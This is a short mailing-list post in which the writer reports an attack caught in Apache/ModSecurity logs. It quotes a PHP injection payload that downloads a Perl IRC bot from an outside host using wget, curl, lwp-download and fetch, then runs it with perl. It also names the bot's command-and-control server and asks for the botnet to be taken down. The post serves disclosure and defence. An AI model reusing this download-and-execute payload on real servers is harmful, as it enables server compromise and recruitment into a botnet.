Subject: Re: Botnet using Plesk vulnerability and takedown

Hi, While reading my apache server logs I found this:

Message: Warning. Pattern match "<\\?(?!xml)" at ARGS_NAMES:<?php echo
"Content-Type:text/html\\r\\n\\r\\n";echo "OK\\n";system("cd
 /tmp;wget http://sirgeox.tk/php.jpg;curl -O
http://sirgeox.tk/php.jpg;lwp-download http://sirgeox.tk/php.jpg;fetch
http://sirgeox.tk/php.jpg;perl php.jpg;rm -rf /
tmp/php.jpg*"); ?>. [file
"/etc/modsecurity/base_rules/modsecurity_crs_40_generic_attacks.conf"]

Then i looked at the php.jpg and found a perl webshell.

my @canais=("#x"); chop (my $realname = `uname -a`); $servidor='
safe.linuxsecured.net' unless $servidor; my $porta='3303';

It used the same KingCope exploit and seems to be the same botnet owner.
His name is Geox.

His irc C&C botnet server is: safe.linuxsecured.net port 3303
Channel #x.

I think you can use your tools to takedown this too.
All the bot that are on the channel is pwned by the plesk script.
Regards,
dummys
